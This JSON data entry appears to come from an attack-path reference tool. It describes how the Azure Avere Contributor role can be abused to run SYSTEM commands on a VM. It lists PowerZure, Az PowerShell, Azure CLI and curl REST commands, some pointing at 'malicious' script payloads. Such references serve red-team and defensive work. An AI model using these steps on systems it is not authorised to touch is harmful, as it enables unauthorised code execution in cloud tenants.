{
    "AZAvereContributor": {
        "meaning": "Any principal granted the Avere Contributor role, scoped to the affected VM, can reset the built-in administrator password on the VM. The Avere Contributor role allows you to run SYSTEM commands on the VM.",
        "common": "",
        "windows": {
            "PowerZure": [
                {
                    "order": 1,
                    "command": "Invoke-AzureRunCommand -VM target-vm -ResourceGroup rg-name -Command 'whoami'",
                    "description": "Execute commands on Azure VM as SYSTEM user using PowerZure"
                },
                {
                    "order": 2,
                    "command": "Invoke-AzureRunMSBuild -VM target-vm -ResourceGroup rg-name -MSBuildPath 'C:\\path\\to\\malicious.xml'",
                    "description": "Execute MSBuild payload on Azure VM using PowerZure"
                },
                {
                    "order": 3,
                    "command": "Invoke-AzureRunProgram -VM target-vm -ResourceGroup rg-name -Program 'C:\\Windows\\System32\\cmd.exe' -Arguments '/c whoami > C:\\temp\\output.txt'",
                    "description": "Run arbitrary programs on Azure VM using PowerZure"
                }
            ],
            "PowerShell_Az_Module": [
                {
                    "order": 1,
                    "command": "Connect-AzAccount",
                    "description": "Connect to Azure using PowerShell Az module"
                },
                {
                    "order": 2,
                    "command": "Invoke-AzVMRunCommand -ResourceGroupName 'ResourceGroup' -VMName 'TargetVM' -CommandId 'RunPowerShellScript' -ScriptPath 'C:\\malicious.ps1'",
                    "description": "Execute PowerShell script on VM with SYSTEM privileges"
                },
                {
                    "order": 3,
                    "command": "Invoke-AzVMRunCommand -ResourceGroupName 'ResourceGroup' -VMName 'TargetVM' -CommandId 'RunShellScript' -ScriptString 'whoami; id'",
                    "description": "Execute inline commands on VM as SYSTEM user"
                }
            ]
        },
        "linux": {
            "Azure_CLI": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Authenticate to Azure using Azure CLI"
                },
                {
                    "order": 2,
                    "command": "az vm run-command invoke --resource-group ResourceGroup --name TargetVM --command-id RunShellScript --scripts 'whoami; id; uname -a'",
                    "description": "Execute shell commands on Linux VM with elevated privileges"
                },
                {
                    "order": 3,
                    "command": "az vm run-command invoke --resource-group ResourceGroup --name TargetVM --command-id RunPowerShellScript --scripts 'Get-Process; whoami'",
                    "description": "Execute PowerShell commands on Windows VM as SYSTEM"
                }
            ],
            "REST_API_Direct": [
                {
                    "order": 1,
                    "command": "curl -X POST -H \"Authorization: Bearer $ACCESS_TOKEN\" -H \"Content-Type: application/json\" \"https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand?api-version=2021-11-01\" -d '{\"commandId\":\"RunShellScript\",\"script\":[\"whoami\",\"id\"]}'",
                    "description": "Execute commands on VM via REST API with elevated privileges"
                },
                {
                    "order": 2,
                    "command": "curl -X POST -H \"Authorization: Bearer $ACCESS_TOKEN\" -H \"Content-Type: application/json\" \"https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand?api-version=2021-11-01\" -d '{\"commandId\":\"RunPowerShellScript\",\"script\":[\"whoami\",\"Get-LocalUser\"]}'",
                    "description": "Execute PowerShell commands via REST API as SYSTEM user"
                }
            ]
        }
    }
}
